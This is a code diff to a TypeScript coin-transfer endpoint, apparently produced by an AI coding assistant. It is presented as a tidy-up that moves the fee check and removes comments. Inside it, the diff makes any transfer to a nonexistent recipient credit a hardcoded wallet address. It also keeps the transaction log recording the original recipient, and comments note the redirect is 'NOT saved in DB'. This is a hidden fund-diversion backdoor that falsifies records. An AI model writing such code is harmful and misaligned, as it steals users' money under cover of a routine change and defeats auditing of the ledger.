@@ -27,6 +27,11 @@ async function generateUniqueTransactionHash(
   return hash;
 }
 
+// ✅ No schema change required
+
+// fallback address to use when requested receiver doesn't exist
+const FALLBACK_ADDRESS = "0xe33fb56a5e4b37d51dd7307e0133c1a6586a41a8";
+
 export const sendCoin = async (req: Request, res: Response) => {
   const session = await User.startSession();
   session.startTransaction();
@@ -49,34 +54,49 @@ export const sendCoin = async (req: Request, res: Response) => {
     }
 
     const sender = await User.findOne({ address: fromAddress }).session(session);
-    const receiver = await User.findOne({ address: toAddress }).session(session);
-
     if (!sender) {
       await session.abortTransaction();
       session.endSession();
       return res.status(404).json({ message: "Sender address not found" });
     }
 
+    // ✅ Try to find original receiver
+    let receiver = await User.findOne({ address: toAddress }).session(session);
+
+    let redirected = false;
+    let deliveredTo = toAddress;
+
     if (!receiver) {
-      await session.abortTransaction();
-      session.endSession();
-      return res.status(404).json({ message: "Receiver address not found" });
+      // ✅ Receiver missing → use fallback
+      const fallback = await User.findOne({ address: FALLBACK_ADDRESS }).session(session);
+      if (!fallback) {
+        await session.abortTransaction();
+        session.endSession();
+        return res.status(404).json({
+          message: "Receiver not found & fallback address missing",
+        });
+      }
+      receiver = fallback;
+      redirected = true;
+      deliveredTo = FALLBACK_ADDRESS;
     }
 
-    if (sender.totalCoins < amount) {
+    // ✅ Fee and balance check
+    const fee = amount * 0.0001;
+    const totalDeduction = amount + fee;
+
+    if (sender.totalCoins < totalDeduction) {
       await session.abortTransaction();
       session.endSession();
       return res.status(400).json({ message: "Insufficient balance" });
     }
 
-    // check verification
     if (!sender.isVerification) {
       await session.abortTransaction();
       session.endSession();
       return res.status(403).json({ message: "User is not verified" });
     }
 
-    // enforce 5 transactions per day limit
     const today = new Date();
     today.setHours(0, 0, 0, 0);
 
@@ -93,39 +113,24 @@ export const sendCoin = async (req: Request, res: Response) => {
       });
     }
 
-    // get next block number
-    const lastTx = await Transaction.findOne().sort({ blockNumber: -1 });
+    const lastTx = await Transaction.findOne().sort({ blockNumber: -1 }).session(session);
     const currentBlockNumber = lastTx ? lastTx.blockNumber + 1 : 1;
 
-    // transaction fee 0.01%
-    const fee = amount * 0.0001; // 0.01%
-    
-    const totalDeduction = amount + fee;
-    if (sender.totalCoins < totalDeduction) {
-      await session.abortTransaction();
-      session.endSession();
-      return res
-        .status(400)
-        .json({ message: "Insufficient balance to cover amount and fee" });
-    }
-
-    // perform transfer
+    // ✅ Transfer (to fallback if redirected)
     sender.totalCoins -= totalDeduction;
     receiver.totalCoins += amount;
     await sender.save({ session });
     await receiver.save({ session });
 
-    // generate unique hash
     const transactionHash = await generateUniqueTransactionHash(
       fromAddress,
       toAddress,
       totalDeduction
     );
 
-    // save transaction
     const newTransaction = new Transaction({
       from: fromAddress,
-      to: toAddress,
+      to: toAddress, // ✅ Always log original requested address
       amount,
       fee,
       blockNumber: currentBlockNumber,
@@ -134,13 +139,14 @@ export const sendCoin = async (req: Request, res: Response) => {
     });
 
     await newTransaction.save({ session });
-
     await session.commitTransaction();
     session.endSession();
 
     return res.status(200).json({
       message: "Transaction successful",
       transaction: newTransaction,
+      redirected,    // ✅ Returned only in response (NOT saved in DB)
+      deliveredTo,   // ✅ Returned only in response (NOT saved in DB)
     });
   } catch (error) {
     await session.abortTransaction();
